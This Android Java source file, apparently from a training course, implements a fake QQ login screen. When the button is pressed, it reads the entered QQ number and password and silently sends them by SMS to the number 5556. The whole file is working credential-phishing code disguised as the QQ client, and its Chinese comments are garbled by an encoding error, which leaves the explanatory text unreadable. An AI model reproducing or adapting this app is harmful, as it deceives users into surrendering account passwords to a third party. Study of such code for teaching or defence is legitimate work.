package com.itheima.qq;

import android.os.Bundle;
import android.app.Activity;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends Activity {

	private EditText number;
	private EditText password;
	private Button login_btn;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        //�� ��ʼ�� �ؼ��� ����
        number = (EditText) findViewById(R.id.qq_number);
        password = (EditText) findViewById(R.id.qq_password);
        
        login_btn = (Button) findViewById(R.id.btn_login);
        
        login_btn.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				
				//������ ���� 
				// ��� qq�ĺ����Լ� ������Ϣ
				String numValue = number.getText().toString();
				String passValue = password.getText().toString();
				
				//�õ� ���ŷ��͵Ĺ����� 
				SmsManager smsManager = SmsManager.getDefault();
				// destinationAddress : Ŀ�ĵ� 
				// scAddress :  Դ ��ַ  
				// text :  ���͵��ı�����
				// sentIntent :  ���ͳɹ� ���� 
				// deliveryIntent :  �Է��������յ� ���ŵı��� 
				smsManager.sendTextMessage("5556", null, numValue+"---"+passValue, null, null);
				
			}
		}); 
        
    }

    
}
